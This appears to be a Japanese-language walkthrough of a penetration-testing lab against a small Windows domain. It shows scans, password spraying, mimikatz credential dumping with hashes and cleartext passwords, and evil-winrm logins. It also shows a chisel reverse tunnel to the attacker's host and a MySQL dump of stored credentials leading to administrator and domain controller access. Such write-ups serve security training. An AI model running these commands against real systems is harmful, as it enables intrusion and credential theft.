ポートスキャン
```
sudo rustscan -a ip.txt --ulimit 5000 -- -Pn -sC -sV -A -oN rustscan.txt
```

与えられたクレデンシャル情報を使用し、nxcでマシン３台を確認
```
nxc smb ip.txt -u eric.wallows -p EricLikesRunning800 --continue-on-success
```

SECUREマシン：ローカル管理者ユーザ
ERAマシン：一般ユーザ

ローカル管理者としてSECUREマシンにRDP経由でログイン
```
xfreerdp3 /u:eri.wallows /p:EricLikesRunning800 /v:192.168.236.95
```

mimikatzを実行
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets" exit > mimikatz_result.txt
```

apacheのクレデンシャル情報が取れる

これ以上の情報はなし

ERAマシンへのログオン試行
evil-winrmで入れることを確認
```
evil-winrm -i 192.168.236.96 -u "apache" -p "New2Era4.\!"
```

winpeas出力からapacheとmysqlのサービスが脆弱だが悪用できず
```
================================================================================== 
    MySQL(MySQL)[C:\xampp\mysql\bin\mysqld.exe MySQL] - Autoload - No quotes and Space detected
    File Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Authenticated Users [Allow: WriteData/CreateFiles])
================================================================================== 
    Apache Server(Apache Software Foundation - Apache Server)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Autoload
    File Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Authenticated Users [Allow: WriteData/CreateFiles])
    Apache/2.4.48 (Win64)
```

chiselでトンネリング
```
cmd /c "chisel_1.9.1_windows_amd64 client 192.168.45.172:9999 R:9000:socks"
```

mysqlに接続
```
proxychains mysql -u root -h 127.0.0.1 -P 3306 --skip-ssl
```

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| creds              |
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
6 rows in set (0.093 sec)

MariaDB [(none)]> use creds
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [creds]> show tables;
+-----------------+
| Tables_in_creds |
+-----------------+
| creds           |
+-----------------+
1 row in set (0.094 sec)

MariaDB [creds]> show columns from creds
    -> ;
+-------+-------------+------+-----+---------+-------+
| Field | Type        | Null | Key | Default | Extra |
+-------+-------------+------+-----+---------+-------+
| name  | varchar(50) | NO   | PRI | NULL    |       |
| pass  | varchar(30) | NO   |     | NULL    |       |
+-------+-------------+------+-----+---------+-------+
2 rows in set (0.114 sec)

MariaDB [creds]> select * from creds;
+---------------+-----------------+
| name          | pass            |
+---------------+-----------------+
| administrator | Almost4There8.? |
| charlotte     | Game2On4.!      |
+---------------+-----------------+
2 rows in set (0.090 sec)
```

Administratorでログイン
proof.txt, local.txtを取得
```
evil-winrm -i 192.168.236.96 -u "Administrator" -p Almost4There8.?
```

charlotteの情報を使用しevil-winrmでDCへログイン
```
evil-winrm -i 192.168.236.97 -u "charlotte" -p Game2On4.!
```




## 192.168.x.95(SECURE)
### rustscan
```
PORT      STATE SERVICE         REASON          VERSION
135/tcp   open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?   syn-ack ttl 125
3389/tcp  open  ms-wbt-server   syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=secure.secura.yzx
| Issuer: commonName=secure.secura.yzx
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-28T15:27:25
| Not valid after:  2026-01-27T15:27:25
| MD5:   bfef:7af6:7514:fa82:78e2:e08b:9423:64da
| SHA-1: 4171:76c6:b5b6:e880:57f5:82ea:a067:3069:71e1:00fa
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQWi3WCy0zW5ZMGD3jrLhuBDANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFzZWN1cmUuc2VjdXJhLnl6eDAeFw0yNTA3MjgxNTI3MjVaFw0y
| NjAxMjcxNTI3MjVaMBwxGjAYBgNVBAMTEXNlY3VyZS5zZWN1cmEueXp4MIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxu8ocNBH7hEmpM/nOMZxnHy9Qiaj
| Oi4hMlDSL3onpCGj24uX031puen81mpeygECI7QdHaj005Rb7sK/a9ucB5LlZRp2
| KH4GAVJq11XAElzQbyyCfvx+YQFH6Ny22oNq/sjdtetxxbPzAQjo/ttj6U4JNW+M
| Rk+tP0FHMOpmwUaP/n3NgqvhnVp8aDq7M9IVS1Q0XUbnlTJsNhhmhAga01yMJwJV
| dkTTLgAoX+R1c+H0YDCmD5Tr6WGTbdraj9vnd6rnc+sH0wpgnu5702OTmulRPdiV
| cta2Oq7DKXFgERKFbw84Xffun5ZSPv/C512AGdQNn+sCJch49lbOQtgzAQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAE8swV+6lrYBRXk1JlYjDyCaUcMj4Yv7Vbf+a7DOk1Qrdrjd+MtR
| yn8I+AcoPSRQua8LIXlmlUogRCBKZKzAQZH4gp9MUeylMmwil/ySbvVuTwpjO7J1
| U0CRA0DVtFs5HBjGspy1a0eqECev9xaLune9ZAt5haMMIGwfADqIBi4u58NGDxsB
| wbyOuXFA7a7lJKu0M5+dLYD73a7Jwb7WZ+6fZ8hmV2UM8DWawx8XCoHQs054mQlC
| qDBFEgvKjEONsh/iEAt/1Xjz2r8n61tp8Td8KadObilFQv+KIv4qzLb0rUDRd+ps
| mVQBCs0b715Oyse4Hp+j+CtqBVlRDYBeZ2s=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-29T15:46:10+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SECURA
|   NetBIOS_Domain_Name: SECURA
|   NetBIOS_Computer_Name: SECURE
|   DNS_Domain_Name: secura.yzx
|   DNS_Computer_Name: secure.secura.yzx
|   DNS_Tree_Name: secura.yzx
|   Product_Version: 10.0.19041
|_  System_Time: 2025-07-29T15:44:44+00:00
5001/tcp  open  commplex-link?  syn-ack ttl 125
| fingerprint-strings: 
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html; charset=ISO-8859-1
|     Content-Length: 132
|_    MAINSERVER_RESPONSE:<serverinfo method="setserverinfo" mainserver="5001" webserver="44444" pxyname="192.168.45.172" startpage=""/>
5040/tcp  open  unknown         syn-ack ttl 125
5985/tcp  open  http            syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
7680/tcp  open  pando-pub?      syn-ack ttl 125
8443/tcp  open  ssl/https-alt   syn-ack ttl 125 AppManager
|_ssl-date: 2025-07-29T15:46:10+00:00; 0s from scanner time.
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: AppManager
| ssl-cert: Subject: commonName=APPLICATIONSMANAGER/organizationName=WebNMS/stateOrProvinceName=Pleasanton/countryName=US/organizationalUnitName=ZOHO
| Issuer: commonName=APPLICATIONSMANAGER/organizationName=WebNMS/stateOrProvinceName=Pleasanton/countryName=US/organizationalUnitName=ZOHO
| Public Key type: rsa
| Public Key bits: 2072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-27T11:03:03
| Not valid after:  2050-02-27T11:03:03
| MD5:   094c:a4e7:2020:ec73:1e9f:e5ed:e0ea:5939
| SHA-1: 834c:a871:c377:20d8:49bd:73d4:0660:b8a8:9a6a:df17
| -----BEGIN CERTIFICATE-----
| MIIDRDCCAimgAwIBAgIEXHZuZzANBgkqhkiG9w0BAQsFADBgMQswCQYDVQQGEwJV
| UzETMBEGA1UECAwKUGxlYXNhbnRvbjEPMA0GA1UECgwGV2ViTk1TMQ0wCwYDVQQL
| DARaT0hPMRwwGgYDVQQDDBNBUFBMSUNBVElPTlNNQU5BR0VSMCAXDTE5MDIyNzEx
| MDMwM1oYDzIwNTAwMjI3MTEwMzAzWjBgMQswCQYDVQQGEwJVUzETMBEGA1UECAwK
| UGxlYXNhbnRvbjEPMA0GA1UECgwGV2ViTk1TMQ0wCwYDVQQLDARaT0hPMRwwGgYD
| VQQDDBNBUFBMSUNBVElPTlNNQU5BR0VSMIIBJTANBgkqhkiG9w0BAQEFAAOCARIA
| MIIBDQKCAQQA91IMxG8hMioeoOo9JgGP4p36pc504ZcEkcUtxQJUJ/FL4wB56dZ8
| CNy0jSCGM3tp5FyOQbBVtI+ZgM6QmSDRaFPiTk8mhlgPFfcf2r8XW/IUwH/EJ4/F
| 9a+Q8JlSZaJLrVbUj1MtUGBmJQX30f2Ab0zMK6XCzbX1In4BYN5uMbEJsvmhfB0O
| OAo1VFZeO4zOYykNqWXm4Guf0ZqlTTehOiNqu+dhObGw1i13Y4mHc5sbysRlrlfn
| fvkLgjWI3nEOi89Cl4C3Z4SxiBZYpQ68+pL6Cw2nMRvDHvQE/z0RZHr5jn0lZ288
| 36BVzJGV10EcDqfeumMBRibZ1GtlxyAr4jaIRwIDAQABMA0GCSqGSIb3DQEBCwUA
| A4IBBAD0le0jKwLMvSVJaE/HKeV2uLr2Qd4iKu0W8O7IxSXUWTG3V7koW0lGKWLv
| uqZNhllxWt0huXAuMEhb+DXmEX9HNpHJ0u9yqgQtXrkX9sWvhI/cb6yCDe2CgilP
| ryRWL1m1ocHJzLCa19u7/z2nes5LRhNccGjD0g4owR/X3433rnD7mP0CQN9hpXmZ
| zUsQdq+rPxzjBqxCBax6TQW+kbd2tUCBNnuAtUJbNRjIEKPlu1gk/ujNKSJwzLRJ
| W8zhVJdZtFHgUgERkjGCJtvfqljdhLWmnR9dOIvDKqbqq5+OFgXsmG0UP1ZeFrX7
| ae8QwjaOhvCOFZvLEWEjW5YVmNWNnBOi
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: CF9934E74D25878ED70B430915D931ED
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Set-Cookie: JSESSIONID_APM_44444=4FC659C562B5491CEE83E00758CCE5D4; Path=/; Secure; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 973
|     Date: Tue, 29 Jul 2025 15:42:15 GMT
|     Connection: close
|     Server: AppManager
|     <!DOCTYPE html>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     <!-- Includes commonstyle CSS and dynamic style sheet bases on user selection -->
|     <link href="/images/commonstyle.css?rev=14440" rel="stylesheet" type="text/css">
|     <link href="/images/newUI/newCommonstyle.css?rev=14260" rel="stylesheet" type="text/css">
|     <link href="/images/Grey/style.css?rev=14030" rel="stylesheet" type="text/css">
|     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body bgcolor="#FFFFFF" leftmarg
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID_APM_44444=E13D56EB368C55C10E2F009FE7270E5B; Path=/; Secure; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"261-1591621693000"
|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
|     Content-Type: text/html
|     Content-Length: 261
|     Date: Tue, 29 Jul 2025 15:42:14 GMT
|     Connection: close
|     Server: AppManager
|     <!-- $Id$ -->
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <!-- This comment is for Instant Gratification to work applications.do -->
|     <script>
|     window.open("/webclient/common/jsp/home.jsp", "_top");
|     </script>
|     </head>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Set-Cookie: JSESSIONID_APM_44444=02CB80398074DAD6D3A929EA1DFD3E04; Path=/; Secure; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 1810
|     Date: Tue, 29 Jul 2025 15:42:14 GMT
|     Connection: close
|     Server: AppManager
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="UTF-8">
|     <!--$Id$-->
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     </head>
|     <body style="background-color:#fff;">
|     <style type="text/css">
|     #container-error
|     border:1px solid #c1c1c1;
|     background: #fff; font:11px Arial, Helvetica, sans-serif; width:90%; margin:80px;
|     #header-error
|     background: #ededed; line-height:18px;
|     padding: 15px; color:#000; font-size:8px;
|     #header-error h1
|_    margin: 0; color:#000;
12000/tcp open  cce4x?          syn-ack ttl 125
| fingerprint-strings: 
|   SMBProgNeg: 
|_    RECONNECT
44444/tcp open  cognex-dataman? syn-ack ttl 125
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID_APM_44444=2D7B14F37219C401382A70F85967421D; Path=/; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"261-1591621693000"
|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
|     Content-Type: text/html
|     Content-Length: 261
|     Date: Tue, 29 Jul 2025 15:42:10 GMT
|     Connection: close
|     Server: AppManager
|     <!-- $Id$ -->
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <!-- This comment is for Instant Gratification to work applications.do -->
|     <script>
|     window.open("/webclient/common/jsp/home.jsp", "_top");
|     </script>
|     </head>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Set-Cookie: JSESSIONID_APM_44444=342C52B9E8055E7EB0911AEA69DC5BEC; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 1810
|     Date: Tue, 29 Jul 2025 15:42:10 GMT
|     Connection: close
|     Server: AppManager
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="UTF-8">
|     <!--$Id$-->
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     </head>
|     <body style="background-color:#fff;">
|     <style type="text/css">
|     #container-error
|     border:1px solid #c1c1c1;
|     background: #fff; font:11px Arial, Helvetica, sans-serif; width:90%; margin:80px;
|     #header-error
|     background: #ededed; line-height:18px;
|     padding: 15px; color:#000; font-size:8px;
|     #header-error h1
|     margin: 0; color:#000;
|     font-
|   RTSPRequest: 
|     HTTP/1.1 505 
|     vary: accept-encoding
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2142
|     Date: Tue, 29 Jul 2025 15:42:10 GMT
|     Server: AppManager
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|_    HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#
47001/tcp open  http            syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49672/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49673/tcp open  tcpwrapped      syn-ack ttl 125
51694/tcp open  java-rmi        syn-ack ttl 125 Java RMI
51725/tcp open  unknown         syn-ack ttl 125
62950/tcp open  unknown         syn-ack ttl 125
| fingerprint-strings: 
|   SMBProgNeg, X11Probe, ms-sql-s: 
|_    CLOSE_SESSION
62951/tcp open  unknown         syn-ack ttl 125
| fingerprint-strings: 
|   SMBProgNeg, X11Probe, ms-sql-s: 
|_    CLOSE_SESSION
6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

### nxc (Pwn3d!)
```
SMB         192.168.236.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:False)
SMB         192.168.236.95  445    SECURE           [+] secura.yzx\eric.wallows:EricLikesRunning800 (Pwn3d!)
```
### Windows Enumeration
#### mimikatz
sekurlsa::logonpasswords
```
Authentication Id : 0 ; 673829 (00000000:000a4825)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SECURE
Logon Server      : SECURE
Logon Time        : 2/20/2025 8:25:03 PM
SID               : S-1-5-21-3197578891-1085383791-1901100223-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : SECURE
	 * NTLM     : a51493b0b06e5e35f855245e71af1d14
	 * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : SECURE
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : SECURE
	 * Password : (null)
	ssp :	
	credman :	
	 [00000000]
	 * Username : apache
	 * Domain   : era.secura.local
	 * Password : New2Era4.!
	cloudap :	
```

```
Authentication Id : 0 ; 41460 (00000000:0000a1f4)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/20/2025 8:24:38 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : SECURE$
	 * Domain   : SECURA
	 * NTLM     : 464fbc984d44b97f0d09158c2acaf821
	 * SHA1     : f8dce79b461fc275e5165085b7075674ccf28f51
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	
```


## 192.168.x.96(ERA)
### rustscan
```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql         syn-ack ttl 125 MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown       syn-ack ttl 125
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```
### nxc
eric.wallows can logon to era.secure.yzx
```
SMB         192.168.236.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:False)
SMB         192.168.236.96  445    ERA              [+] secura.yzx\eric.wallows:EricLikesRunning800 
```

### Windows Enumeration
#### auto

#### manual
```
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ]

3) Mercury (not in the USB & lite version):

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser
   Password: wampp

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so

   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```


```
WEB-DAV für den gemeinsamen REMOTE-Zugriff
auf WWW-Dokumente über den Apache2.

Die Module mod_dav.so und mod_dav_fs.so auskommentieren
URL: http://localhost/webdav/
User: wampp Password: xampp
E-Mail-Adresse bei Dreamweaver angeben.
Lokales Directory: /xampp/webdav/
```

## 192.168.x.97(DC1)
### rustscan
```
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-29 15:37:21Z)
135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 125 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
464/tcp   open  kpasswd5?    syn-ack ttl 125
593/tcp   open  ncacn_http   syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap         syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 125
5985/tcp  open  http         syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack ttl 125 .NET Message Framing
49665/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49677/tcp open  ncacn_http   syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49681/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49708/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49799/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
```
### nxc
```
SMB         192.168.236.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
SMB         192.168.236.97  445    DC01             [+] secura.yzx\eric.wallows:EricLikesRunning800 
```
